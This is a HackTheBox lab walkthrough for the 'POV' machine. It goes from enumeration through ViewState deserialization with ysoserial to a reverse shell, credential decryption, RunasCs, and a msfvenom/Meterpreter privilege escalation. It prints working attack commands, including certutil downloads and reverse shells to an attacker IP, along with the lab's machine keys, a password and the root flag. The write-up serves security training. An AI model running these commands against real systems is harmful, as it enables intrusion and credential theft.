
Hello there, welcome to my walkthrough. Today, I will be hacking the HackTheBox machine called POV.

## Enumeration
so like every other box we must begin with an nmap scan.... 

Nmap is short for Network Mapper. It is an open-source Linux
command-line tool that is used to scan IP addresses and ports in a
network and to detect installed applications.

Nmap allows network admins to find which devices are running on
their network, discover open ports and services, and detect
vulnerabilities.

command used: ```nmap -sC -sV -T4 -oN scan -p- -P0 <IP>```


![[1.png]]

from our scan we can see that we have only 1 open port (80) which is running a http server. 
we can also take note of the domain contained in the scan (http://pov.htb) and add it to our hosts file to enable it resolve when been accessed by our web browser.

Command used: ```echo "10.10.11.251 pov.htb" | sudo tee -a /etc/hosts```


![[2.png]]
with that step complete we can now head over to our browser to view the webpage.


![[3.png]]
we can see that the interface presents a business website. so my first approach whenever i come across something like this is to analyse and view the source code of the page.


![[4.png]]
so doing this i found nothing quite interesting so this led me to run a directory enumeration scan using Gobuster.

Command used: 
```
gobuster dir -u http://pov.htb  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

```


nothing Interesting found yet. so another step is to run a subdomain enumeration on the target using the following command:

```
gobuster vhost -u http://pov.htb/ -t 35 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --append-domain -k --no-error
```


![[6.png]]
so finally!!!!, we've found something interesting. let's add it to our hosts file and check it out 

command: ```echo "10.10.11.251 dev.pov.htb" | sudo tee -a /etc/hosts```



![[7.png]]
scrolling through the page nothing seems interesting but the download CV button draws my attention so lets check that out 


![[8.png]]
so we can try to intercept the request using one of our favorite tool called burpsuite.

so we intercept our request when we click on the Download button and then send the request to repeater and change the file from cv.pdf to /web.config.


![[9.png]]
By changing the requested file from "cv.pdf" to "/web.config", we aim to retrieve the web configuration file, which can contain sensitive information such as database credentials, API keys, or other configuration settings that could aid further exploitation or unauthorized access


![[10.png]]
so now let's find a way to exploit this vulnerability. from further researches i was able to find a possible method we can use to exploit this. it can be found [[https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter]]

first of all we need to generate a powershell payload and set up listener.

to do this we would be making use of **PowerJoker**  => [[https://github.com/Adkali/PowerJoker]]

commands used: ```git clone https://github.com/Adkali/PowerJoker.git


```
cd PowerJoker 
pip3 install -r requirements.txt
python3 PowerJoker.py -l [ LOCAL MACHINE ] -p [ PORT ]
```


![[11.png]]
so after generating the payload powerjoker automatically sets up a listener for us, so we leave the listener active because we are going to need it later. we can use our powershell in our windows machine  and then download the ysoserial.exe file from here [[(https://github.com/pwntester/ysoserial.net/releases/tag/v1.36)]]

Navigate towards the file and paste the payload using the following command and press enter.

```
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" -c "Paste_the_payload_here"
```
![[Screenshot (31).png]]
now we intercept the request once again and change the content of the **VIEWSTATE=** parameter to the generated output of our previously ran script and send the request.

finally we have gotten a shell as user sfitz.

![[12.png]]
so let's begin snooping around for useful informations so  we can find to exploit this machine further.


![[13.png]]
we can see that we are logged in as the user **sfitz** 


![[14.png]]
after a while of poking around we found a file located in the Documents directory called connection.xml. let's attempt to view this file 

```
Command used : type connection.xml
```



![[17.png]]
from the file we can see a  username (alaading) and an encoded password

now we can make use of the following lines of code to get the password and decode it.



```
echo > pass.txt  
$EncryptedString = Get-Content .\pass.txt  
$SecureString = ConvertTo-SecureString $EncryptedString  
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString  
echo $Credential.GetNetworkCredential().password
```
![[18.png]]
while running the following command  tried creating the pass.txt file in the Documents directory of the user sfitz but it seems that we do not have write permissions so i had to switch over  to the Desktop  directory to create my pass.txt file there.

![[19.png]]

and now we have successfully gotten our password.
 

**RunasCs** is a utility to run specific processes with different permissions than the user’s current logon provides using explicit credentials.

we can download the binary and transfer it over to our target machine.

download RunasCs Binary 

``` 
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
unzip RunasCs
cd RunasCS
```

to transfer the file to the target machine we would be using a simple python http server in the RunasCs directory.

python web server:
``` 
python3 -m http.server 8000
```

with our web server ready we can download on our target machine by running the following command: 

```
certutil -urlcache -f http://10.10.14.112:8989/RunasCs.exe RunasCs.exe
```
![[before.png]]

now  we can execute RunasCs.exe and use the credentials we have to gain access to the user alaading's shell.

command used : 
```
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.112:4343
```


![[21.png]]
now we can wait for our listener to grab the connection.


![[22.png]]
Hurray!!!! we have successfully gained access. let's try to locate the user.txt file 


![[23.png]]
lets's Escalate Priviliege.


## Privilege Escalation 

we type “whoami /priv”, we can see that the “sedebugPrivilegePoC” privilege has been disabled. To enable the state of this privilege, we would need to download this files **filespsgetsys.ps1**, **EnableAllTokenPrivs.ps1** on our local machine and send it over to the target using the same technique as before. On your machine, use the following command to create a Windows payload:

![[whoami-priv.png]]


```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f exe > exploit.exe
```



Start python server on local machine directory containing files:


```
python3 -m http.server 8083
```



Download files to remote target System:

```
certutil -urlcache -f http://10.10.14.112:8989/RunasCs.exe RunasCs.exe
certutil -urlcache -f http://local_IP:8989/root.exe root.exe
certutil -urlcache -f http://local_IP:8989/psgetsys.ps1 psgetsys.ps1
```


The **tokens that appear as Disabled** can be enable, you  actually can abuse _Enabled_ and _Disabled_ tokens.


## Enable All the tokens

read more on Token abuse here: [[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens]]

If you have tokens disables, you can use the script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) to enable all the tokens:

```
.\psgetsys.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

now lets open a new terminal and start msfconsole. we set up a multi/handler in Metasploit to receive a Meterpreter session, you would typically use the `exploit/multi/handler` module. Below is the Metasploit command to accomplish this:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 3939
set ExitOnSession false
exploit

```

After issuing the "run" command within the msfconsole, proceed to initiate the payload on alaading’s shell using the subsequent command.

```
.\root.exe
```

and BOOOM we get a shell!!!!!!!!!

![[privesc shell.png]]


now we would need to migrate our shell to **winlogon.exe** process. to do this we can make use of the ps command on our meterpreter shell to identify the PID of the **winlogon.exe** process.

![[winlogon.png]]

now migrate by using the following command 

```
migrate <PID>
```

![[PID.png]]


we can now drop into a shell and get the the root flag.![[root1.png]]

**ROOT FLAG:** 72d2d40d7691f1c632dc3f8cf6c76225

![[screenshot.png]]**Name: Jude Nwadinobi**
**Discord Username: d4rk5id3.**
**HackTheBox Username: D4RK5ID3**

**EJPT CERTIFICATION LINK**: [Junior Penetration Tester • Jude Nwadinobi • INE - Expert IT Training & Certifications](https://certs.ine.com/a7fb709b-42d4-4cc3-8971-bd186e5e0117)



